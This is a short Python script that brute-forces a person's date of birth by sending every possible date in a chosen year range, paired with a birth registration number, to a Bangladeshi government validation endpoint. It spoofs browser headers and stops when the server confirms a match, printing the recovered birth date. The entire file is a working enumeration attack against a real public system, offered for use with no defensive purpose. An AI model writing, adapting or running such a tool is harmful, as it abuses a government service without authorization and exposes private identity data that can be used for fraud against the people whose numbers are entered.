import requests
import json

# ANSI escape codes for colored output
GREEN = "\033[92m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Taking user input for UBRN and year range
ubrn = str(input(BOLD + "What is the birthday No:--  " + RESET))
start_year = int(input(BOLD + "Enter the start year:--  " + RESET))
end_year = int(input(BOLD + "Enter the End year:--  " + RESET))

url = "https://ibas.finance.gov.bd/acs/general/BrnValidate"

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'Content-Type': "application/json",
    'sec-ch-ua-platform': "\"Android\"",
    'X-Requested-With': "XMLHttpRequest",
    'sec-ch-ua': "\"Not(A:Brand\";v=\"99\", \"Android WebView\";v=\"133\", \"Chromium\";v=\"133\"",
    'sec-ch-ua-mobile': "?1",
    'Origin': "https://ibas.finance.gov.bd",
    'Sec-Fetch-Site': "same-origin",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://ibas.finance.gov.bd/acs/general/sales",
    'Accept-Language': "en-US,en;q=0.9"
}

# Iterating through possible date combinations
for year in range(start_year, end_year + 1):  # Using user input for year range
    for month in range(1, 13):  # Months 1-12
        for day in range(1, 32):  # Days 1-31 (handling invalid dates later)
            try:
                dob = f"{year:04d}-{month:02d}-{day:02d}"  # Formatting DOB
                payload = {"ubrn": ubrn, "dob": dob}

                response = requests.post(url, data=json.dumps(payload), headers=headers)
                response_data = response.json()

                response_code = response_data.get("responseCode")
                
                print(BOLD + (45 * "-") + RESET)  # Added line for separation
                print(BOLD + f"Trying DOB: {dob} -> Response Code: {response_code}" + RESET)

                if response_code == "0":  # If response code is "0", print success in GREEN
                    print(GREEN + BOLD + "Successfully processed!" + RESET)
                    print(BOLD + (45 * "-") + RESET)
                    print(GREEN + BOLD + f"Birthday No: {ubrn}" + RESET)
                    print(GREEN + BOLD + f"Successfully processed! DOB No: {dob}" + RESET)
                    exit()

                if response_code == "SUCCESS":  # Adjust based on actual success response
                    print(BOLD + f"Valid DOB found: {dob}" + RESET)
                    print(BOLD + (45 * "-") + RESET)
                    print(GREEN + BOLD + f"Birthday No: {ubrn}" + RESET)
                    print(GREEN + BOLD + f"Successfully processed! DOB No: {dob}" + RESET)
                    exit()  # Stop execution if a valid DOB is found

            except Exception as e:
                print(BOLD + f"Error with DOB {dob}: {e}" + RESET)
                
